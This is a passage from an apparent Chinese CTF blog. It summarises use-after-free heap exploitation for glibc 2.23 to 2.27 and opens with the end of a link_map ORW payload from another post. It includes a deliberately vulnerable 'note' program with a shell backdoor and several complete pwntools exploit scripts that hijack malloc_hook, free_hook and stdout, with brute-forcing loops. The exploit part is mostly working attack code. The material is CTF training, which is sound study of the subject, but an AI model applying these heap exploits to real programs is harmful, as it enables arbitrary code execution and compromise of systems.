p64(libc_base+libc.sym['write'])\n\nfake_link_map_data = \"\"\n#set l_addr(0) point to fini_array\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x20) + p64(0x0)   \t#0 \t1\n#set l_next(3) and *(l_next)=vdso_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr+0x5a0)  \t#2 \t3\n#set l_real(5) point to fake_link_map_chunk_addr\nfake_link_map_data += p64(0x0) + p64(fake_link_map_chunk_addr)\t\t\t#4 \t5\nfake_link_map_data += p64(setcontext_addr+53) + p64(ret)\t\t\t\t#6 \t7\nfake_link_map_data += orw\t\t\t\t\t\t\t\t\t\t\t\t#8~25\nfake_link_map_data = fake_link_map_data.ljust(26*8,'\\x00')\n\n#for rcx  push rcx\nfake_link_map_data += p64(fake_rsp) + p64(ret)\t\t\t\t\t\t\t#26 27\nfake_link_map_data += p64(0x0) + p64(0x0)\t\t\t\t\t\t\t\t#28 29\n#flag_addr = fake_link_map_chunk_addr + 30*8\nfake_link_map_data += './flag\\x00\\x00'\t\t\t\t\t\t\t\t\t#30\nfake_link_map_data = fake_link_map_data.ljust(34*8,'\\x00')\t\t\t\t#30~33\n\n#fake circle link_list\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x110) + p64(0x0)\t#34 35\nfake_link_map_data += p64(fake_link_map_chunk_addr+0x120) + p64(0x20)\t#36 37\n```\n\n▲这里需要注意的是由于ld动态连接加载的事情，所以就算是同一个版本中的link_map相对于libc基地址在不同机器中也有可能是不同的，需要爆破第4，5两位，一个字节。\n\n▲题外话：适用到ld动态链接库的话，如果直接patchelf的话，很可能出错的，原因未知。推荐还是用docker:\n\n[PIG-007/pwnDockerAll (github.com)](https://github.com/PIG-007/pwnDockerAll)\n\n## 2.触发条件\n\n(1)调用exit()\n(2)能够从main函数返回\n\n## 3.适用条件\n\nban掉了很多东西的时候。但是这个需要泄露地址才行的，另外由于可能需要爆破一个字节，所以如果还涉及其他的爆破就得慎重考虑一下了，别到时候爆得黄花菜都凉了。\n","tags":["Heap"],"categories":["PWN","pwn堆-Skill"]},{"title":"各版本UAF专场","url":"/2021/08/19/各版本UAF专场/","content":"\n# 前言\n\n一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为fastbin attack会检查size位，通常还需要伪造。\n\n这里就2.23~2.32版本的UAF做个总结利用，各个条件的缩减。\n\n# 一、题目及调试脚本\n\n▲首先给出自己为了方便调试写的题和对应的exp，存在UAF，堆溢出，后门，malloc和calloc切换等多个漏洞，但是去除了Double free参考note题目：\n\n```c\n//gcc -ggdb note.c -o note\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nchar* notelist[1000];\nint* freelist[1000];\n\nint count = 0;\n\n\nvoid backdoor() {\n   puts(\"You hacked me!!\");\n   system(\"/bin/sh\");\n}\n\nvoid malloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)malloc(size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid calloc_add_note(){\n    int i = count;\n    char buf[8];\n    int size;\n    char* chunk;\n    printf(\"Note size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    chunk = (char *)calloc(0x1,size);\n    if (!chunk)\n    {\n        puts(\"Alloca Error\");\n        exit(-1);\n    }\n    printf(\"Content :\");\n    read(0, chunk, size);\n    puts(\"Success!\");\n    notelist[i] = chunk;\n    count++;\n}\n\nvoid del_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx] && (freelist[idx] != idx))\n    {\n        free(notelist[idx]);\n        freelist[idx] = idx;\n        puts(\"Success!\");\n        return;\n    }\n    else\n    {\n        puts(\"Can not double free!\");\n        return;\n        \n\n    }\n\n}\n\nvoid print_note()\n{\n    char buf[4];\n    int idx;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    if (notelist[idx])\n    {\n        puts(notelist[idx]);\n        return;\n    }\n}\n\nvoid edit_note()\n{\n    char buf[8];\n    int idx;\n    int size;\n    printf(\"Index :\");\n    read(0, buf, 4);\n    idx = atoi(buf);\n    if (idx < 0 || idx >= count)\n    {\n        puts(\"Out of bound!\");\n        return;\n    }\n    printf(\"Size :\");\n    read(0, buf, 8);\n    size = atoi(buf);\n    if (notelist[idx])\n    {\n        printf(\"Content :\");\n        read(0, notelist[idx], size);\n        puts(\"Success!\");\n        return;\n    }\n}\n\n\nvoid menu() {\n    puts(\"----------------------\");\n    puts(\"       MY  NOTE       \");\n    puts(\"----------------------\");\n    puts(\" 1. Malloc Add note   \");\n    puts(\" 2. Delete note       \");\n    puts(\" 3. Print note        \");\n    puts(\" 4. Edit note         \");\n    puts(\" 5. Calloc Add note   \");\n    puts(\" 6. Exit              \");\n    puts(\"--------Author:PIG-007\");\n    printf(\"Your choice :\");\n};\n\nint main() {\n    setvbuf(stdout, 0, 2, 0);\n    setvbuf(stdin, 0, 2, 0);\n    freelist[0] = 1001;\n    char* heap_leak = (char*)(malloc(0x438));\n    printf(\"Gift_Heap:%p\\n\",heap_leak);\n\n    char* libc_leak = (char*)&printf;\n    printf(\"Gift_Libc:%p\\n\",libc_leak);\n    \n    char* elf_leak = (char*)&main;\n    printf(\"Gift_elf:%p\\n\",elf_leak);\n    \n    free(heap_leak);\n    heap_leak = NULL;\n    libc_leak = NULL;\n    elf_leak = NULL;\n    char buf[4];\n    while (1) {\n        menu();\n        read(0, buf, 4);\n        switch(atoi(buf))\n        {\n            case 1:\n                malloc_add_note();\n                break;\n            case 2:\n                del_note();\n                break;\n            case 3:\n                print_note();\n                break;\n            case 4:\n                edit_note();\n                break;\n            case 5:\n                calloc_add_note();\n                break;\n            case 6:\n                exit(0);\n                break;\n            default:\n                puts(\"Invalid choice!\");\n                break;\n        }\n    }\n    return 0;\n\n}\n```\n\n 对应exp设置：\n\n```python\n# -*- coding:UTF-8 -*-\n\nfrom pwn import *\n#from LibcSearcher import *\nimport commands\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\ncontext.timeout = 0.5\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./note\"\ncontext.binary = binary\nlibc = ELF(context.binary.libc.path)\nelf = ELF(binary)\nlargeBinIdx = 1096\nunsortedBinIdx = 88\n\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['/glibc/2.24/64/lib/ld-linux-x86-64.so.2', './hello'], env={\"LD_PRELOAD\":\"/glibc/2.24/64/lib/libc-2.24.so\"})\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)  \nuu32    = lambda data   :u32(data.ljust(4, '\\0'))\nuu64    = lambda data   :u64(data.ljust(8, '\\0'))\nu64Leakbase = lambda offset :u64(ru(\"\\x7f\")[-6: ] + '\\0\\0') - offset\nu32Leakbase = lambda offset :u32(ru(\"\\xf7\")[-4: ]) - offset\nit      = lambda                    :p.interactive()\n\ndef dockerDbg():\n\tmyGdb = remote(\"127.0.0.1\",30001)\n\tmyGdb.close()\n\tpause()\n\ndef dbg():\n\tgdb.attach(p)\n\tpause()\n\ndef lg(string,addr):\n    print('\\033[1;31;40m%20s-->0x%x\\033[0m'%(string,addr))\n\ndef add_malloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'1')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef free(idx):\n\tp.sendlineafter(\"Your choice :\",'2')\n\tp.sendlineafter('Index :',str(idx))\n\ndef show(idx):\n\tp.sendlineafter(\"Your choice :\",'3')\n\tp.sendlineafter('Index :',str(idx))\n    \ndef edit(idx,size,content):\n\tp.sendlineafter(\"Your choice :\",'4')\n\tp.sendlineafter('Index :',str(idx))\n\tp.sendlineafter('Size :',str(size))\n\tp.sendafter('Content :',content)    \n    \ndef add_calloc(size,content):\n\tp.sendlineafter(\"Your choice :\",'5')\n\tp.sendlineafter('Note size :',str(size))\n\tp.sendafter('Content :',content)\n\ndef exit():\n\tp.sendlineafter(\"Your choice :\",'6')\n\ndef edit_m(idx,size,content):\n\tsleep(0.01)\n\tp.sendline('4')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef free_m(idx):\n\tsleep(0.01)\n\tp.sendline('2')\n\tsleep(0.01)\n\tp.sendline(str(idx))\n\tsleep(0.01)\n\ndef add_malloc_m(size,content):\n\tsleep(0.01)\n\tp.sendline('1')\n\tsleep(0.01)\n\tp.sendline(str(size))\n\tsleep(0.01)\n\tp.send(content)\n\tsleep(0.01)\n\ndef tcacheDelete(idx):\n\tfor i in range(7):\n\t\tfree(i+idx)\n        \ndef tcacheMalloc(size):\n\tfor i in range(7):\n\t\tadd_malloc(size,'\\x00')\n\ndef leak_heap():\n\tglobal largeBinIdx\n\tglobal unsortedBinIdx\n\tru(\"Gift_Heap:0x\")\n\tLeakHeap = int(rc(12),16)\n\tlog.info(\"LeakHeap:0x%x\"%LeakHeap)\n\tpath = libc.path\n\t#version = [\"2.23\",\"2.27\",\"2.29\",\"2.31\",\"2.32\",\"2.33\"]\n\tif(\"2.23\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.24\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.25\" in path):\n\t\theap_base = LeakHeap - 0x10\n\telif(\"2.26\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.27\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.28\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.29\" in path):\n\t\theap_base = LeakHeap - 0x250 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.30\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.31\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.32\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telif(\"2.33\" in path):\n\t\theap_base = LeakHeap - 0x290 - 0x10\n\t\tlargeBinIdx = 1104\n\t\tunsortedBinIdx = 96\n\telse:\n\t\tprint(\"Version Wrong!\")\n\t\tquit()\n\treturn heap_base\n\ndef leak_elf():\n\tru(\"Gift_elf:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakElf:0x%x\"%Leak)\n\treturn Leak\n\ndef leak_libc():\n\tru(\"Gift_Libc:0x\")\n\tLeak = int(rc(12),16)\n\tlog.info(\"LeakLibc:0x%x\"%Leak)\n\treturn Leak\n\ndef getMain_arena(libc_base):\n\treturn libc_base+libc.sym['__malloc_hook']+0x10\n\ndef getOnegadget():\n    originStr=commands.getstatusoutput('one_gadget ' + context.binary.libc.path)[1]\n    print originStr\n    one_gadget = []\n    lstKey = [] \n    lengthKey = 0\n    key = 'execve'\n    countStr = originStr.count(key)\n    if countStr < 1:\n        print('No one_gadget')\n    elif countStr == 1: #only one one_gadget\n        indexKey = originStr.find(key)\n        one_gadget.append(int(originStr[indexKey-8:indexKey-1],16))\n        return one_gadget\n    else: #multiple one_gadgey\n        indexKey = originStr.find(key)\n        lstKey.append(indexKey) \n        while countStr > 1:\n            str_new = originStr[indexKey+1:len(originStr)+1]\n            indexKey_new = str_new.find(key)\n            indexKey = indexKey+1 +indexKey_new\n            lstKey.append(indexKey)\n            countStr -= 1\n        for i in range(len(lstKey)):\n            one_gadget.append(int(originStr[(lstKey[i]-8):lstKey[i]-1],16))\n        return one_gadget\n\n    \ndef pwn():\n    heap_base = leak_heap()\n    libc_base = leak_libc() - libc.sym['printf']\n    elf_base = leak_elf() - elf.sym['main']\n    log.info(\"heap_base:0x%x\"%heap_base)\n    log.info(\"libc_base:0x%x\"%libc_base)\n    log.info(\"elf_base:0x%x\"%elf_base)\n    add_malloc(0x1000-0x290-0x8,'PIG007NB')\n\n    \n    \ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\texcept Exception:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n\n\n# 二、环境搭建\n\n## 前言\n\n众所周知，pwn的Glibc环境向来是一个难解题，很多大佬在编译不同版本的Glibc都很头疼，一个不注意就容易出错。像Github上的`glibc-all-in-one`搭配`patchelf`\n\n`glibc-all-in-one`:[matrix1001/glibc-all-in-one: 🎁A convenient glibc binary and debug file downloader and source code auto builder (github.com)](https://github.com/matrix1001/glibc-all-in-one)\n\n`patchelf`:[NixOS/patchelf: A small utility to modify the dynamic linker and RPATH of ELF executables (github.com)](https://github.com/NixOS/patchelf)\n\n对于很多人来说搞个虚拟机编译环境一个包没装好就容易挂掉，然后就GG，这实在是很浪费生命的一件事情。而`patchelf`其实有时候也不太顶用，还有`Docker`里的\n\n`pwnDocker`:[skysider/pwndocker - Docker Image | Docker Hub](https://hub.docker.com/r/skysider/pwndocker)\n\n其实有时候也感觉不太好用，而且需要依靠作者更新，自己编译也容易出错。但是这倒是激发了我一个想法，为每个Libc版本搭建个docker容器，然后通过映射关系将题目映射进容器中，相当于只需要容器中的libc环境，这样就不需要考虑这些东西了。\n\n## 项目\n\n经过大量测试，自己写了一个小项目，适合所有Libc版本，只要docker hub中有对应libc版本的ubuntu容器，该容器对应的apt源还有在更新，就能用，跟自己本身环境没啥关系。实测所有版本都行，一键搭建，一键使用：\n\nGithub:[PIG-007/pwnDockerAll (github.com)](https://github.com/PIG-007/pwnDockerAll)\n\nGitee:[PIG-007/pwnDockerAll (gitee.com)](https://gitee.com/Piggy007/pwnDockerAll)\n\n详情看项目里。\n\n\n\n# 三、Glibc2.23\n\n## 1.UAF + Leak + Size不做限制：\n\n这种情况直接free进unsortedbin泄露地址，然后打fastbin attack，借助0x7f字节错位劫持malloc_hook即可，没啥技术含量。这里再说一些，其实0x56也是可以的，可以借助unsortedbin attack将堆地址写到一个地方然后字节错位也是可以的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png)\n\n0x7f：0111 1**11**1\n\n0x56：0101 0**11**0\n\n主要看的是AM位，加粗的两位，不能刚好是10，检测：\n\n(1)是否属于当前线程的main_arena\n\n(2)是否是mmap出来的chunk的检测\n\n所以按照道理来讲，尾数为4 5 c d四个系列不能通过检测，其他都可以的。而对于堆地址的随机性，0x56和0x55都是可能的，所以也不一定成功，同样需要爆破。\n\n```python\n#注释头\n\none_gadget = getOnegadget()\nadd_malloc(0x418,'PIG007NB')\nadd_malloc(0x68,'PIG007NB')\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(88 + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nfree(2)\nedit(2,0x8,p64(libc_base + libc.sym['__malloc_hook']-0x23))\nadd_malloc(0x68,'PIG007NB')\n\nfor i in range(len(one_gadget)):\n    lg(\"one_gadget[\"+str(i)+\"]\",libc_base+one_gadget[i])\nadd_malloc(0x68,'\\x00'*0x13+p64(libc_base+one_gadget[]))\n#add_malloc(0x18,'PIG007NB')\np.sendline('1')\np.sendline('1')\np.sendline('1')\np.interactive()\n```\n\n需要注意的是这里由于覆写了_IO_wide_data部分数据，有些数据可能打印不出来，直接一股脑发送信息申请堆块即可。至于one_gadget没办法用的，参照realloc_hook调整栈帧。\n\n## 2.UAF + Leak + size限制\n\n▲比如说size限制不能申请0x70大小的堆块，那么就没办法字节错位申请malloc_hook的地方。一般来说有以下几种情况：\n\n(1)只能是小Chunk，即0x20~0x80：\n\n泄露heap地址，修改FD，指向上一个chunk来修改size，释放进入unsortedbin后泄露得到libc地址，之后再借用0x7f的UAF字节错位申请即可到malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，然后利用fastbinY链在main_arean上留下size，申请过去修改top_chunk为malloc_hook-0x10或者malloc_hook-0x28，修复unsortedbin之后即可任意修改。\n\n```python\n#注释头\n\none_gadget = getOnegadget()\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr = main_arena + 80\nidx = (target_addr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(size-0x8,'PIG007NB')\nadd_malloc(0x2f8,'PIG007NB')\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(0xf8,'PIG007NB')\n\nfree(2)\nshow(2)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nmain_arena = libc_base + libc.sym['main_arena']\ntarget_addr = libc_base+libc.sym['global_max_fast']\n\nedit(2,0x18,p64(0x0)+p64(target_addr-0x10))\nadd_malloc(0x2f8,'\\x00')\n\nfree(1)\nedit(1,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\n\nfree(3)\nedit(3,0x8,p64(libc_base + libc.sym['main_arena'] + 0x48))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(malloc_hook-0x28)+p64(0x0)+p64(main_arena+88)*2)\nadd_malloc(0x98,p64(0x0)*2+p64(libc_base + one_gadget[1])+p64(libc_base+libc.sym['realloc']+8))\np.sendline('1')\np.sendline('1')\np.sendline('1')\nit()\n```\n\n这里就利用realloc调整了一下栈帧\n\n(3)只能是大chunk，即0x400~...\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n```python\n#注释头\n\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr_binsY = libc.sym['__free_hook']-0x10\nidx = (target_addr_binsY - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx1\nadd_malloc(0x4f8,'/bin/sh\\x00')\t\t#idx2\n\nadd_malloc(size-0x8,'PIG007NB')\t\t#idx3\nadd_malloc(size+0x10-0x8,'PIG007NB')\t#idx4\n\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\n\ntarget_addr = libc_base+libc.sym['global_max_fast']\nlog.info(\"target_addr:0x%x\"%target_addr)\n#change unsortedBinchunkA\n#chunkA.fd could be anything\n\nedit(1,0x4f8,p64(0x0)+p64(target_addr-0x10)) \n#have to malloc all from unsortedbin\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx4\nfree(3)\nedit(3,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\nfree(4)\nedit(4,0x8,p64(libc_base + target_addr_binsY -0x8))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\nfree(2)\nit()\n```\n\n(4)只能是某个特定大小的chunk，比如只能是0x40，0x60，一般不会只能是一个大小的，不然基本无法利用。\n\n泄露地址heap地址后，修改size位进入unsortedbin中，再泄露libc地址。由于无法0x56和0x7f字节错位利用，所以只能利用一个size的bin，释放之后在fastbinY中留下size，然后另一个size申请过去，修改top_chunk到malloc_hook处即可，之后类似。\n\n详情参照CISCN东北赛区复现中的题目small_chunk。\n\n## 3.UAF + 无Leak + Size不做限制\n\n▲无Leak通常需要爆破，同样用unsortedbin attack部分写unsortedbin中chunk的bk指针，修改global_max_fast，之后利用fastbinY机制劫持_IO_2_1_stdout_结构体，泄露出地址，然后就和之前一样，再利用fastbinY机制劫持free_hook即可。\n\n```python\n#注释头\n\ndef pwn():\n\t#one_gadget = getOnegadget()\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\n\tadd_malloc(0x1000-0x8,'PIG007NB')\n\n\t#prepare data-----------------------------------------------------------\n\tguess_libc = 0x9000\n\tguess_heap = 0x2000\n\tfastbinsY = guess_libc + libc.sym['main_arena'] + 8\n\t_IO_read_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x10\n\t_IO_write_base = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x20\n\t_IO_write_ptr = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x28\n\t_IO_write_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\tidx_read_end = (_IO_read_end - fastbinsY) / 8\n\tsize_read_end = idx_read_end * 0x10 + 0x20\n\n\tidx_write_base = (_IO_write_base - fastbinsY) / 8\n\tsize_write_base = idx_write_base * 0x10 + 0x20\n\n\tidx_write_ptr = (_IO_write_ptr - fastbinsY) / 8\n\tsize_write_ptr = idx_write_ptr * 0x10 + 0x20\n\n\tidx_write_end = (_IO_write_end - fastbinsY) / 8\n\tsize_write_end = idx_write_end * 0x10 + 0x20\n\n\ttarget_addr_gMF = guess_libc + libc.sym['global_max_fast']\n\n\tfastbinsY = libc.sym['main_arena'] + 8\n\ttarget_addr_binsY = libc.sym['__free_hook']-0x10\n\tidx_free_hook = (target_addr_binsY - fastbinsY) / 8\n\tsize_free_hook = idx_free_hook * 0x10 + 0x20\n\n\t#read_end-------------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x1\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x2  point free  read_end\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,'\\x04'*0x18+p64(0x21)+'\\x04'*0x18)\t\t#idx\t0x4\n\n\tfree(0x1)\n\t#free(2)\n\tfree(0x3)\n\tedit(0x3,0x1,'\\x20')\n\tedit(0x1,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x05'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0x5\n\tadd_malloc(0x38,'\\x06'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0x6 #point change size\n\t#---------------------------------------------------------------------\n\n\n\t#write_end can not be so far from wirte_base\n\tadd_malloc(size_write_end-0x8,(p64(0x0)+p64(0x21))*((size_write_end-0x10)/0x10))\t\t\t\t#idx\t0x7\n\tadd_malloc(size_write_ptr-0x8,(p64(0x0)+p64(0x21))*((size_write_ptr-0x10)/0x10))\t\t\t\t#idx\t0x8\n\n\n\t#write_base-----------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x9\n\tadd_malloc(0x38,\"\\xaa\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x0b\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,'\\x0c'*0x18+p64(0x21)+'\\xaa'*0x18)\t\t#idx\t0xc\n\n\tfree(0x9)\n\t#free(2)\n\tfree(0xb)\n\tedit(0xb,0x2,p16((guess_heap+0x1000+0x40)&0xffff))\n\tedit(0x9,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x0d'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0xd\n\tadd_malloc(0x38,'\\x0e'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0xe #point free\n\t#---------------------------------------------------------------------\n\n\n\n\t#prepare for free_hook\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\t\t\t#idxf\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\t\t#idx10\n\n\n\t#unsortedbin attack\n\tadd_malloc(0x4f8,'\\x11'*0x4f8)\t\t\t#idx 0x11\n\tadd_malloc(0x38,'\\x12'*0x38)\t\t\t#idx 0x12\n\tfree(0x11)\n\tedit(0x11,0x8+0x2,p64(0x0)+p16((target_addr_gMF&0xffff)-0x10))\n\tadd_malloc(0x4f8,'/bin/sh\\x00')\t\t\t#idx 0x13\n\n\n\n\t#change write_base \n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_write_base+1))\n\tfree_m(0xe)\n\n\n\t#change write_end and write_ptr\n\tfree_m(0x7)\n\tfree_m(0x8)\n\n\n\t#change read_end\n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_read_end+1))\n\tfree_m(0x2)\n\n\tlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\tlg(\"libc_base\",libc_base)\n\n\t#write free_hook - 0x10\n\tfree(0xf)\n\n\t#left size\n\tedit(0xf,0x8,p64(size_free_hook+0x10+1))\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\n\n\t#get free_hook - 0x8\n\tfree(0x10)\n\tedit(0x10,0x8,p64(libc_base + target_addr_binsY -0x8))\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\n\tadd_malloc(size_free_hook+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\n\n\t#get shell\n\tfree(0x13)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n▲通常需要注意的是，write_base和write_end不能相距太远，不然很容易数据量过大而崩溃。还有这里最后泄露地址是\n\nlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\n这是因为IO流的机制，会在写入数据的0x10处上写下libc.sym['_IO_2_1_stdout_']+131的地址，所以这里直接就能泄露。\n\n▲题外话：爆破的数学期望为1/256\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-17_18-07-31.png)\n\n## 4.UAF + 无Leak + Size做限制\n\n▲同样size做限制一般也分为以下几种\n\n(1)只能是小Chunk，即0x20~0x80：\n\n这个也是一样的，利用UAF部分写入heap_addr制造堆块重叠，修改size域，放入unsortedbin，然后部分写入libc_addr打unsortedbin attack修改global_max_fast，之后就类似了，劫持_IO_2_1_stdout泄露地址，fastbinY机制劫持main_arena，修复unsortedbin后改top_chunk劫持malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n类似，部分写修改size域打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址。fastbinY机制劫持free_hook。\n\n(3)只能是大chunk，即0x400~...\n\n直接用部分写libc_addr打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n(4)指定的chunk size。\n\n▲其实对于UAF来说，size做没做限制都差不了太多，因为都可以部分写堆块地址制造堆重叠，然后就能修改size域，唯一区分的就是申请时候的限制，小的就打top_chunk，大的就直接打_free_hook。比较有意思的一点就是限制特定size，一般限制为两个，以前遇到0x20和0x30，也有0x40和0x50的，都是大同小异，借用fastbinY机制留下size后申请过去即可。\n\n \n\n# 四、Glibc2.27\n\nUAF在这个版本下对于tcache实在是好用，由于tcache不检查size位，也不检查FD，只要泄露了地址，加上UAF就能实现任意申请。而对于无show功能的，既可以借助unsortedbin踩下地址后爆破直接申请，也可以unsortedbin attack劫持global_fast_max之后再劫持IO_2_1_stdout结构泄露地址。\n\n## 1.Sashing机制带来的改变\n\n### (1)加入的检查判断：\n\n需要注意的一点是，由于加入了tcache的stahing机制，所以在从fastbin中申请时会有一个判断：\n\n（**这个在2.26开始就存在的，只不过可能代码不太一样，所以有tcache的地方，fastbin修改fd从而在main_arena上留下fd的功能就无法使用了）**\n\n![Snipaste_2021-08-19_21-32-57](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108192133799.png)\n\n 